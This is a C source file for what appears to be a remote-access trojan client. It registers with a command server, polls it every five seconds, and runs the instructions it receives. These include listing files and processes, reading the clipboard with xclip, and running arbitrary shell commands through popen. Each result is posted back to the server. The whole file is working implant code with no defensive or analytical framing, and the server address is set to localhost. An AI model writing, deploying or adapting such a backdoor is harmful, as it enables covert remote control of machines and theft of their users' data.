#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <uuid/uuid.h>
#include <unistd.h>
#define SERVER_URL "http://127.0.0.1:8080/client"

char client_uuid[37];

struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (ptr == NULL) {
        printf("Not enough memory to allocate buffer.\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

void generate_uuid() {
    uuid_t binuuid;
    uuid_generate(binuuid);
    uuid_unparse(binuuid, client_uuid);
    printf("Client UUID: %s\n", client_uuid);
}
int register_client() {
    CURL *curl;
    CURLcode res;
    int success = 0;

    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = NULL;
        char uuid_header[50];
        snprintf(uuid_header, sizeof(uuid_header), "UUID: %s", client_uuid);

        headers = curl_slist_append(headers, uuid_header);

        curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, ""); 
        struct MemoryStruct chunk;
        chunk.memory = malloc(1);
        chunk.size = 0;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            printf("Server Response: %s\n", chunk.memory);

            if (chunk.memory && strstr(chunk.memory, "Message received")) {
                success = 1; 
            } else {
                printf("Unexpected response: %s\n", chunk.memory);
            }
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        free(chunk.memory);
    }

    return success;
}

char *get_command_from_server() {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = NULL;
        char uuid_header[50];
        snprintf(uuid_header, sizeof(uuid_header), "UUID: %s", client_uuid);

        headers = curl_slist_append(headers, uuid_header);

        curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            printf("Server Response: %s\n", chunk.memory);
            if (strstr(chunk.memory, "StatusGatewayTimeout")) {
                printf("Timeout received. Retrying...\n");
                free(chunk.memory);
                return NULL;
            }

            return chunk.memory;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        free(chunk.memory);
    }

    return NULL;
}
char *handle_command(const char *response_json) {
    char *result = NULL;
    const char *command_key = "\"command\":";
    const char *start, *end;
    start = strstr(response_json, command_key);
    if (!start) {
        return strdup("Error: 'command' key not found in the response.");
    }
    start += strlen(command_key);
    while (*start == ' ' || *start == '"') { start++; } 
    end = strchr(start, '"');
    if (!end) {
        return strdup("Error: Invalid JSON format for 'command' value.");
    }

    size_t command_len = end - start;
    char *command = malloc(command_len + 1);
    if (!command) {
        return strdup("Error: Memory allocation failed.");
    }
    strncpy(command, start, command_len);
    command[command_len] = '\0'; 

    if (strcmp(command, "list_files") == 0) {
        FILE *fp = popen("ls -l", "r");
        if (fp == NULL) {
            asprintf(&result, "Error: Unable to list files.");
            free(command);
            return result;
        }

        size_t len = 0;
        size_t chunk_size = 1024;
        result = malloc(chunk_size);
        if (!result) {
            pclose(fp);
            free(command);
            return strdup("Error: Memory allocation failed.");
        }

        size_t offset = 0;
        while (fgets(result + offset, chunk_size - offset, fp)) {
            offset += strlen(result + offset);
            if (offset >= chunk_size - 1) {
                chunk_size *= 2;
                result = realloc(result, chunk_size);
                if (!result) {
                    pclose(fp);
                    free(command);
                    return strdup("Error: Memory allocation failed.");
                }
            }
        }
        pclose(fp);

    } else if (strcmp(command, "get_clipboard") == 0) {
        FILE *fp = popen("xclip -o -selection clipboard", "r");
        if (fp == NULL) {
            asprintf(&result, "Error: Unable to access clipboard.");
            free(command);
            return result;
        }

        size_t len = 0;
        getline(&result, &len, fp);
        pclose(fp);
        if (result == NULL) {
            free(command);
            return strdup("Error: Clipboard is empty or not accessible.");
        }

    } else if (strncmp(command, "execute_command ", 16) == 0) {
        const char *cmd = command + 16;
        FILE *fp = popen(cmd, "r");
        if (fp == NULL) {
            asprintf(&result, "Error: Unable to execute command: %s", cmd);
            free(command);
            return result;
        }

        size_t len = 0;
        size_t chunk_size = 1024;
        result = malloc(chunk_size);
        if (!result) {
            pclose(fp);
            free(command);
            return strdup("Error: Memory allocation failed.");
        }

        size_t offset = 0;
        while (fgets(result + offset, chunk_size - offset, fp)) {
            offset += strlen(result + offset);
            if (offset >= chunk_size - 1) {
                chunk_size *= 2;
                result = realloc(result, chunk_size);
                if (!result) {
                    pclose(fp);
                    free(command);
                    return strdup("Error: Memory allocation failed.");
                }
            }
        }
        pclose(fp);

    } else if (strcmp(command, "list_processes") == 0) {
        FILE *fp = popen("ps -aux", "r");
        if (fp == NULL) {
            asprintf(&result, "Error: Unable to list processes.");
            free(command);
            return result;
        }

        size_t len = 0;
        size_t chunk_size = 1024;
        result = malloc(chunk_size);
        if (!result) {
            pclose(fp);
            free(command);
            return strdup("Error: Memory allocation failed.");
        }

        size_t offset = 0;
        while (fgets(result + offset, chunk_size - offset, fp)) {
            offset += strlen(result + offset);
            if (offset >= chunk_size - 1) {
                chunk_size *= 2;
                result = realloc(result, chunk_size);
                if (!result) {
                    pclose(fp);
                    free(command);
                    return strdup("Error: Memory allocation failed.");
                }
            }
        }
        pclose(fp);

    } else {
        asprintf(&result, "Error: Unknown command: %s", command);
    }

    free(command);
    return result;
}

void send_result_to_server(const char *command, const char *result, const char *client_uuid) {
    CURL *curl;
    CURLcode res;
    char post_data[2048];
    snprintf(post_data, sizeof(post_data), "{\"command\": \"%s\", \"result\": \"%s\"}", command, result);
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        struct curl_slist *headers = NULL;
        char uuid_header[128];
        snprintf(uuid_header, sizeof(uuid_header), "UUID: %s", client_uuid);
        headers = curl_slist_append(headers, uuid_header);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            printf("Result sent to server successfully.\n");
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    curl_global_cleanup();
}
int main() {
    generate_uuid();

    if (!register_client()) {
        printf("Failed to register client. Exiting...\n");
        return 1;
    }

    while (1) {
        printf("Polling server for commands...\n");
        char *command = get_command_from_server();
        if (command && strlen(command) > 0) {
            char *result = handle_command(command);
            
            send_result_to_server(command, result, client_uuid);

            free(command);
            free(result);
        } else {
            printf("No command received. Retrying...\n");
        }

        sleep(5);
    }

    return 0;
}
